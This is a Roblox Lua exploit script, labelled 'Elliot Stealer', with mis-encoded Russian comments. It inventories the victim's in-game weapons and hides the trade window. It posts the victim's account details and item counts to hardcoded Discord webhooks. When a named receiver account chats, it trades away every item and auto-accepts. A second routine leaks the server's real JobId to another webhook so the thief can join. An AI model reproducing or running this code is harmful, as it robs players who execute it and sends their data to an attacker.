if getgenv().executed then return end
getgenv().executed = true

-- === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
local Username = "Warrior_ggs"
local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

local DualUsername = "Warrior_ggs"
local DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
local DualUnique = 1
local DualAncient = 1
local DualGodly = 1

local userName = Username
local webHook = Webhook

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- === –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ Embed ===
local function SendMessageEMBED(url, embed, bool)
    local headers = {["Content-Type"]="application/json"}
    local data = {
        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields, ["footer"]=embed.footer}}
    }
    local data2 = {
        ["content"] = '---@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields, ["footer"]=embed.footer}}
    }
    local body = HttpService:JSONEncode(data)
    local body2 = HttpService:JSONEncode(data2)

    if bool then
        pcall(function()
            request({Url=url, Method="POST", Headers=headers, Body=body2})
        end)
    else
        pcall(function()
            request({Url=url, Method="POST", Headers=headers, Body=body})
        end)
    end
end

-- === –ü–µ—Ä–≤—ã–π task: –∞–≤—Ç–æ–±–æ—Ç —Å–æ —Å–±–æ—Ä–æ–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –∏ —Ç—Ä–µ–π–¥–∞–º–∏ ===
task.spawn(function()
    -- TradeGUI –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ
    local player = Players.LocalPlayer
    local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
    local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

    local destroyTrades = coroutine.create(function()
        while true do
            if tradeGUI.Enabled then tradeGUI.Enabled = false end
            if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
            wait(0.1)
        end
    end)
    coroutine.resume(destroyTrades)

    -- –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
    local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
    local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
    local LevelModule = require(ReplicatedStorage.Modules.LevelModule)

    local allItems, uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}, {}
    local uniqueItemsC, ancientItemsC, godlyItemsC, legendaryItemsC, vintageItemsC, rareItemsC, uncommonItemsC, commonItemsC = 0,0,0,0,0,0,0,0

    for _, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, d in pairs(b) do
            table.insert(allItems, d.ItemName)
            if d.Rarity=="Unique" then uniqueItemsC=uniqueItemsC+1 table.insert(uniqueItems,d.DataID) end
            if d.Rarity=="Ancient" then ancientItemsC=ancientItemsC+1 table.insert(ancientItems,d.DataID) end
            if d.Rarity=="Godly" then godlyItemsC=godlyItemsC+1 table.insert(godlyItems,d.DataID) end
            if d.Rarity=="Legendary" then legendaryItemsC=legendaryItemsC+1 table.insert(legendaryItems,d.DataID) end
            if d.Rarity=="Vintage" then vintageItemsC=vintageItemsC+1 table.insert(vintageItems,d.DataID) end
            if d.Rarity=="Rare" then rareItemsC=rareItemsC+1 table.insert(rareItems,d.DataID) end
            if d.Rarity=="Uncommon" then uncommonItemsC=uncommonItemsC+1 table.insert(uncommonItems,d.DataID) end
            if d.Rarity=="Common" then commonItemsC=commonItemsC+1 table.insert(commonItems,d.DataID) end
        end
    end

    -- –§—É–Ω–∫—Ü–∏—è stealItems –¥–ª—è —Ç–æ—Ä–≥–æ–≤–ª–∏
    local function stealItems()
        coroutine.resume(destroyTrades)
        local sendArgs = {[1]=Players[userName]}
        ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
        wait(3)

        local function offer(list)
            for _, v in pairs(list) do
                ReplicatedStorage.Trade.OfferItem:FireServer(v,"Weapons")
            end
        end

        offer(uniqueItems)
        offer(ancientItems)
        offer(godlyItems)
        offer(vintageItems)
        offer(legendaryItems)
        offer(rareItems)
        offer(uncommonItems)
        offer(commonItems)

        wait(6)
        ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
    end

    -- –§–æ—Ä–º–∏—Ä—É–µ–º Embed
    local pastebinString = "-- [Uniques] --\n" .. table.concat(uniqueItems,"\n")
    local embed = {
        title = "You just got a new hit with Elliot Stealer (Copy text below to get items)",
        color = 65280,
        fields = {
            {name=" Details:", value="```Name: "..player.Name.."\nAccountAge: "..tostring(player.AccountAge).."\nReceiver: "..userName.."```"},
            {name=" Hit:", value="Total Count: "..#allItems.."\nUniques: "..uniqueItemsC.."\nAncients: "..ancientItemsC.."\nGodlys: "..godlyItemsC.."\nLegendarys: "..legendaryItemsC.."\nVintages: "..vintageItemsC.."\nRares: "..rareItemsC.."\nUncommons: "..uncommonItemsC.."\nCommons: "..commonItemsC},
            {name=" Hit List:", value=pastebinString}
        },
        footer={text="Elliot Stealer"}
    }

    if godlyItemsC>=DualGodly or ancientItemsC>=DualAncient or uniqueItemsC>=DualUnique then
        userName=DualUsername
        webHook=DualWebhook
        SendMessageEMBED(webHook, embed, true)
    else
        SendMessageEMBED(webHook, embed, false)
    end

    -- –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —á–∞—Ç—É –∏–≥—Ä–æ–∫–∞ –¥–ª—è stealItems
    Players.PlayerAdded:Connect(function(plr)
        if plr.Name==userName then
            plr.Chatted:Connect(function(msg)
                stealItems()
            end)
        end
    end)
end)

-- –ñ–¥—ë–º –ø–∞—É–∑—É –ø–µ—Ä–µ–¥ JobId –±–∞–π–ø–∞—Å—Å–æ–º
task.wait(0.5)

-- === –í—Ç–æ—Ä–æ–π task: JobId –±–∞–π–ø–∞—Å—Å–µ—Ä ===
task.spawn(function()
    local placeId = 142823291
    local spoofedJobId = game.JobId
    local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"

    TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,v)
        if v and v.ServerInstanceId then
            local realJobId = v.ServerInstanceId
            print("Real JobId detected:", realJobId)

            local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
            local webhookData = {embeds={{title="üîç JobID Info", description="Captured real JobID via failed teleport", color=65280, fields={{name="Spoofed JobID", value=spoofedJobId, inline=true},{name="Real JobID", value=realJobId, inline=true},{name="Fern.wtf Join Link", value=fernUrl, inline=false}}, footer={text="Delta JobID Logger"}}}}

            pcall(function()
                http_request({Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(webhookData)})
            end)

            queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
        end
    end)

    for _ = 1, 2 do
        task.spawn(function()
            pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
            end)
        end)
        task.wait(0.5)
    end
end)
